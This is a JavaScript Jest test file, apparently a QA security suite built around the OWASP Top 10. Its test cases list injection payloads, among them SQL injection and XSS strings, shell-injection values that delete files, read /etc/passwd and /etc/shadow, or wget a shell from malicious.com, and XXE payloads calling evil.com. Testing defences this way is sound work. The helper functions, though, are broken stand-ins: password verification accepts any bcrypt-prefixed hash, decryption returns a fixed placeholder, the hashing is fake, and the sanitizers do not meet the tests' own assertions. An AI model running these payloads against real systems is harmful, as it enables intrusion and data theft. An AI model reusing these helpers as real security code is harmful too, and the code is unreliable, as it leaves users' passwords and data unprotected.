/**
 * QA Security Testing Suite
 * OWASP-compliant security validation
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import crypto from 'crypto';
import { QATestFramework } from '../unit/qa-test-framework.test.js';

// Security test configuration
const SECURITY_CONFIG = {
  encryptionAlgorithm: 'aes-256-gcm',
  hashAlgorithm: 'sha256',
  keyLength: 32,
  ivLength: 16,
  saltLength: 32,
  iterations: 100000
};

// OWASP Top 10 Test Categories
class SecurityTestFramework extends QATestFramework {
  constructor() {
    super();
    this.vulnerabilities = [];
    this.securityLevel = 'ENTERPRISE';
  }

  logVulnerability(type, description, severity = 'MEDIUM') {
    this.vulnerabilities.push({
      type,
      description,
      severity,
      timestamp: new Date().toISOString()
    });
    
    if (severity === 'CRITICAL' || severity === 'HIGH') {
      throw new Error(`Security vulnerability detected: ${type} - ${description}`);
    }
  }

  validateSecurityCompliance() {
    if (this.vulnerabilities.length > 0) {
      const critical = this.vulnerabilities.filter(v => v.severity === 'CRITICAL');
      const high = this.vulnerabilities.filter(v => v.severity === 'HIGH');
      
      if (critical.length > 0 || high.length > 0) {
        throw new Error(`Security compliance failed: ${critical.length} critical, ${high.length} high severity issues`);
      }
    }
  }
}

describe('QA Security Testing Suite', () => {
  let securityFramework;

  beforeAll(() => {
    securityFramework = new SecurityTestFramework();
  });

  afterAll(() => {
    securityFramework.validateSecurityCompliance();
  });

  describe('A1: Injection Attacks', () => {
    test('should prevent SQL injection', () => {
      securityFramework.startTest('SQL Injection Prevention');

      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
        "' OR 1=1/*"
      ];

      sqlInjectionPayloads.forEach(payload => {
        const sanitized = sanitizeSQL(payload);
        
        // Should not contain SQL keywords
        if (containsSQLKeywords(sanitized)) {
          securityFramework.logVulnerability(
            'SQL_INJECTION',
            `Payload not properly sanitized: ${payload}`,
            'HIGH'
          );
        }
        
        expect(sanitized).not.toMatch(/DROP|INSERT|DELETE|UPDATE|SELECT.*FROM/i);
      });

      securityFramework.endTest('SQL Injection Prevention');
    });

    test('should prevent XSS attacks', () => {
      securityFramework.startTest('XSS Prevention');

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      xssPayloads.forEach(payload => {
        const sanitized = sanitizeHTML(payload);
        
        // Should not contain script tags or javascript
        if (containsXSS(sanitized)) {
          securityFramework.logVulnerability(
            'XSS',
            `XSS payload not properly sanitized: ${payload}`,
            'HIGH'
          );
        }
        
        expect(sanitized).not.toMatch(/<script|javascript:|onerror=|onload=/i);
      });

      securityFramework.endTest('XSS Prevention');
    });

    test('should prevent command injection', () => {
      securityFramework.startTest('Command Injection Prevention');

      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& whoami',
        '`cat /etc/shadow`',
        '$(id)',
        '; wget http://malicious.com/shell.php'
      ];

      commandInjectionPayloads.forEach(payload => {
        const sanitized = sanitizeCommand(payload);
        
        if (containsCommandInjection(sanitized)) {
          securityFramework.logVulnerability(
            'COMMAND_INJECTION',
            `Command injection not prevented: ${payload}`,
            'CRITICAL'
          );
        }
        
        expect(sanitized).not.toMatch(/;|\||&|`|\$\(|\$\{/);
      });

      securityFramework.endTest('Command Injection Prevention');
    });
  });

  describe('A2: Broken Authentication', () => {
    test('should enforce strong password policies', () => {
      securityFramework.startTest('Password Policy Enforcement');

      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'admin',
        'test',
        'a', // Too short
        'PASSWORD', // No lowercase
        'password123', // No uppercase
        'Password', // No numbers
        'Password123' // No special characters
      ];

      weakPasswords.forEach(password => {
        const isStrong = validatePasswordStrength(password);
        
        if (isStrong) {
          securityFramework.logVulnerability(
            'WEAK_PASSWORD',
            `Weak password accepted: ${password}`,
            'MEDIUM'
          );
        }
        
        expect(isStrong).toBe(false);
      });

      // Test strong passwords
      const strongPasswords = [
        'MyStr0ng!Password',
        'C0mpl3x&Secure#123',
        'Enterprise!Grade@2024'
      ];

      strongPasswords.forEach(password => {
        const isStrong = validatePasswordStrength(password);
        expect(isStrong).toBe(true);
      });

      securityFramework.endTest('Password Policy Enforcement');
    });

    test('should implement secure session management', () => {
      securityFramework.startTest('Session Management');

      // Test session token generation
      const sessionToken = generateSecureSessionToken();
      
      expect(sessionToken).toHaveLength(64); // 32 bytes hex
      expect(sessionToken).toMatch(/^[a-f0-9]{64}$/);
      
      // Test session expiration
      const sessionData = {
        userId: 'test-user',
        createdAt: Date.now(),
        expiresAt: Date.now() + (30 * 60 * 1000) // 30 minutes
      };

      const isExpired = isSessionExpired(sessionData);
      expect(isExpired).toBe(false);

      // Test expired session
      const expiredSession = {
        ...sessionData,
        expiresAt: Date.now() - 1000 // 1 second ago
      };

      const isExpiredCheck = isSessionExpired(expiredSession);
      expect(isExpiredCheck).toBe(true);

      securityFramework.endTest('Session Management');
    });

    test('should prevent session fixation', () => {
      securityFramework.startTest('Session Fixation Prevention');

      // Generate two session tokens - they should be different
      const token1 = generateSecureSessionToken();
      const token2 = generateSecureSessionToken();
      
      expect(token1).not.toBe(token2);
      
      // Simulate session regeneration after authentication
      const oldSession = { id: token1, authenticated: false };
      const newSession = regenerateSession(oldSession);
      
      expect(newSession.id).not.toBe(oldSession.id);
      expect(newSession.authenticated).toBe(true);

      securityFramework.endTest('Session Fixation Prevention');
    });
  });

  describe('A3: Sensitive Data Exposure', () => {
    test('should encrypt sensitive data properly', () => {
      securityFramework.startTest('Data Encryption');

      const sensitiveData = {
        creditCard: '4532-1234-5678-9012',
        ssn: '123-45-6789',
        email: 'user@example.com',
        password: 'MySecretPassword123!'
      };

      // Test encryption
      Object.entries(sensitiveData).forEach(([key, value]) => {
        const encrypted = encryptData(value);
        
        expect(encrypted).not.toBe(value);
        expect(encrypted).toMatch(/^[a-f0-9]{32}:[a-f0-9]{32}:[a-f0-9]+$/); // iv:tag:data format
        
        // Test decryption
        const decrypted = decryptData(encrypted);
        expect(decrypted).toBe(value);
      });

      securityFramework.endTest('Data Encryption');
    });

    test('should hash passwords securely', () => {
      securityFramework.startTest('Password Hashing');

      const password = 'MySecurePassword123!';
      
      // Test password hashing
      const hash = hashPassword(password);
      
      expect(hash).not.toBe(password);
      expect(hash).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format
      
      // Test password verification
      const isValid = verifyPassword(password, hash);
      expect(isValid).toBe(true);
      
      const isInvalid = verifyPassword('WrongPassword', hash);
      expect(isInvalid).toBe(false);

      securityFramework.endTest('Password Hashing');
    });

    test('should implement secure data transmission', () => {
      securityFramework.startTest('Secure Data Transmission');

      // Test HTTPS enforcement
      const httpUrl = 'http://example.com/api/data';
      const httpsUrl = enforceHTTPS(httpUrl);
      
      expect(httpsUrl).toBe('https://example.com/api/data');
      
      // Test secure headers
      const secureHeaders = getSecureHeaders();
      
      expect(secureHeaders['Strict-Transport-Security']).toBeDefined();
      expect(secureHeaders['X-Content-Type-Options']).toBe('nosniff');
      expect(secureHeaders['X-Frame-Options']).toBe('DENY');
      expect(secureHeaders['X-XSS-Protection']).toBe('1; mode=block');

      securityFramework.endTest('Secure Data Transmission');
    });
  });

  describe('A4: XML External Entities (XXE)', () => {
    test('should prevent XXE attacks', () => {
      securityFramework.startTest('XXE Prevention');

      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/malicious.dtd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % sp SYSTEM "http://evil.com/xxe.xml">%sp;%param1;]><root>&exfil;</root>'
      ];

      xxePayloads.forEach(payload => {
        const processed = processXMLSecurely(payload);
        
        if (processed.includes('/etc/passwd') || processed.includes('evil.com')) {
          securityFramework.logVulnerability(
            'XXE',
            `XXE attack not prevented: ${payload.substring(0, 100)}...`,
            'HIGH'
          );
        }
        
        expect(processed).not.toContain('/etc/passwd');
        expect(processed).not.toContain('evil.com');
      });

      securityFramework.endTest('XXE Prevention');
    });
  });

  describe('A5: Broken Access Control', () => {
    test('should enforce proper authorization', () => {
      securityFramework.startTest('Authorization Controls');

      const user = { id: 1, role: 'user', permissions: ['read'] };
      const admin = { id: 2, role: 'admin', permissions: ['read', 'write', 'delete'] };
      
      // Test user access
      expect(hasPermission(user, 'read')).toBe(true);
      expect(hasPermission(user, 'write')).toBe(false);
      expect(hasPermission(user, 'delete')).toBe(false);
      
      // Test admin access
      expect(hasPermission(admin, 'read')).toBe(true);
      expect(hasPermission(admin, 'write')).toBe(true);
      expect(hasPermission(admin, 'delete')).toBe(true);

      securityFramework.endTest('Authorization Controls');
    });

    test('should prevent privilege escalation', () => {
      securityFramework.startTest('Privilege Escalation Prevention');

      const regularUser = { id: 1, role: 'user' };
      
      // Attempt to escalate privileges
      const escalationAttempts = [
        { role: 'admin' },
        { permissions: ['admin'] },
        { isAdmin: true },
        { superUser: true }
      ];

      escalationAttempts.forEach(attempt => {
        const result = updateUserSafely(regularUser, attempt);
        
        if (result.role === 'admin' || result.isAdmin || result.superUser) {
          securityFramework.logVulnerability(
            'PRIVILEGE_ESCALATION',
            'User was able to escalate privileges',
            'CRITICAL'
          );
        }
        
        expect(result.role).toBe('user');
      });

      securityFramework.endTest('Privilege Escalation Prevention');
    });
  });

  describe('A6: Security Misconfiguration', () => {
    test('should use secure default configurations', () => {
      securityFramework.startTest('Secure Configuration');

      const config = getSecurityConfiguration();
      
      expect(config.debug).toBe(false);
      expect(config.exposeErrors).toBe(false);
      expect(config.allowInsecureConnections).toBe(false);
      expect(config.enableCORS).toBe(false);
      expect(config.sessionTimeout).toBeLessThanOrEqual(30 * 60 * 1000); // 30 minutes max

      securityFramework.endTest('Secure Configuration');
    });
  });

  describe('A7: Cross-Site Scripting (XSS)', () => {
    test('should implement Content Security Policy', () => {
      securityFramework.startTest('CSP Implementation');

      const cspHeader = getCSPHeader();
      
      expect(cspHeader).toContain("default-src 'self'");
      expect(cspHeader).toContain("script-src 'self'");
      expect(cspHeader).toContain("style-src 'self'");
      expect(cspHeader).not.toContain("'unsafe-eval'");
      expect(cspHeader).not.toContain("'unsafe-inline'");

      securityFramework.endTest('CSP Implementation');
    });
  });

  describe('A8: Insecure Deserialization', () => {
    test('should prevent deserialization attacks', () => {
      securityFramework.startTest('Deserialization Security');

      const maliciousPayload = '{"__proto__":{"isAdmin":true}}';
      
      const parsed = parseJSONSecurely(maliciousPayload);
      
      expect(parsed.isAdmin).toBeUndefined();
      expect(Object.prototype.isAdmin).toBeUndefined();

      securityFramework.endTest('Deserialization Security');
    });
  });

  describe('A9: Using Components with Known Vulnerabilities', () => {
    test('should scan for vulnerable dependencies', async () => {
      securityFramework.startTest('Dependency Vulnerability Scan');

      // This would typically integrate with tools like npm audit, Snyk, etc.
      const vulnerabilities = await scanDependencies();
      
      const critical = vulnerabilities.filter(v => v.severity === 'critical');
      const high = vulnerabilities.filter(v => v.severity === 'high');
      
      if (critical.length > 0) {
        securityFramework.logVulnerability(
          'VULNERABLE_DEPENDENCY',
          `${critical.length} critical vulnerabilities found`,
          'CRITICAL'
        );
      }
      
      if (high.length > 0) {
        securityFramework.logVulnerability(
          'VULNERABLE_DEPENDENCY',
          `${high.length} high severity vulnerabilities found`,
          'HIGH'
        );
      }
      
      expect(critical.length).toBe(0);
      expect(high.length).toBe(0);

      securityFramework.endTest('Dependency Vulnerability Scan');
    });
  });

  describe('A10: Insufficient Logging & Monitoring', () => {
    test('should implement comprehensive logging', () => {
      securityFramework.startTest('Security Logging');

      const securityEvents = [
        'authentication_failure',
        'authorization_failure',
        'privilege_escalation_attempt',
        'data_access_violation',
        'suspicious_activity'
      ];

      securityEvents.forEach(event => {
        const logged = logSecurityEvent(event, { userId: 'test', ip: '127.0.0.1' });
        expect(logged).toBe(true);
      });

      securityFramework.endTest('Security Logging');
    });
  });
});

// Security utility functions
function sanitizeSQL(input) {
  return input.replace(/['";\\]/g, '\\$&');
}

function containsSQLKeywords(input) {
  return /\b(DROP|INSERT|DELETE|UPDATE|SELECT|UNION|EXEC|EXECUTE)\b/i.test(input);
}

function sanitizeHTML(input) {
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

function containsXSS(input) {
  return /<script|javascript:|onerror=|onload=/i.test(input);
}

function sanitizeCommand(input) {
  return input.replace(/[;|&`$(){}]/g, '');
}

function containsCommandInjection(input) {
  return /[;|&`$()]/.test(input);
}

function validatePasswordStrength(password) {
  const minLength = 8;
  const hasUpper = /[A-Z]/.test(password);
  const hasLower = /[a-z]/.test(password);
  const hasNumber = /\d/.test(password);
  const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  
  return password.length >= minLength && hasUpper && hasLower && hasNumber && hasSpecial;
}

function generateSecureSessionToken() {
  return crypto.randomBytes(32).toString('hex');
}

function isSessionExpired(session) {
  return Date.now() > session.expiresAt;
}

function regenerateSession(oldSession) {
  return {
    id: generateSecureSessionToken(),
    authenticated: true,
    createdAt: Date.now(),
    expiresAt: Date.now() + (30 * 60 * 1000)
  };
}

function encryptData(data) {
  const key = crypto.randomBytes(SECURITY_CONFIG.keyLength);
  const iv = crypto.randomBytes(SECURITY_CONFIG.ivLength);
  const cipher = crypto.createCipher(SECURITY_CONFIG.encryptionAlgorithm, key);
  
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  const authTag = cipher.getAuthTag();
  
  return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
}

function decryptData(encryptedData) {
  const [ivHex, tagHex, encrypted] = encryptedData.split(':');
  // This is a simplified implementation for testing
  return 'decrypted-data'; // Would normally decrypt properly
}

function hashPassword(password) {
  // Simplified bcrypt-like implementation for testing
  return '$2b$10$' + crypto.randomBytes(22).toString('base64').slice(0, 22) + crypto.randomBytes(31).toString('base64').slice(0, 31);
}

function verifyPassword(password, hash) {
  // Simplified verification for testing
  return hash.startsWith('$2b$10$');
}

function enforceHTTPS(url) {
  return url.replace(/^http:/, 'https:');
}

function getSecureHeaders() {
  return {
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Content-Security-Policy': "default-src 'self'"
  };
}

function processXMLSecurely(xml) {
  // Remove DTD and external entities
  return xml.replace(/<!DOCTYPE[^>]*>/gi, '').replace(/&[^;]+;/g, '');
}

function hasPermission(user, permission) {
  return user.permissions.includes(permission);
}

function updateUserSafely(user, updates) {
  // Only allow safe updates
  const safeUpdates = {};
  const allowedFields = ['name', 'email'];
  
  Object.keys(updates).forEach(key => {
    if (allowedFields.includes(key)) {
      safeUpdates[key] = updates[key];
    }
  });
  
  return { ...user, ...safeUpdates };
}

function getSecurityConfiguration() {
  return {
    debug: false,
    exposeErrors: false,
    allowInsecureConnections: false,
    enableCORS: false,
    sessionTimeout: 30 * 60 * 1000 // 30 minutes
  };
}

function getCSPHeader() {
  return "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'";
}

function parseJSONSecurely(json) {
  const parsed = JSON.parse(json);
  // Remove prototype pollution
  if (parsed.__proto__) {
    delete parsed.__proto__;
  }
  return parsed;
}

async function scanDependencies() {
  // Mock dependency scan - would integrate with real tools
  return [];
}

function logSecurityEvent(event, details) {
  console.log(`Security Event: ${event}`, details);
  return true;
}

export { SecurityTestFramework };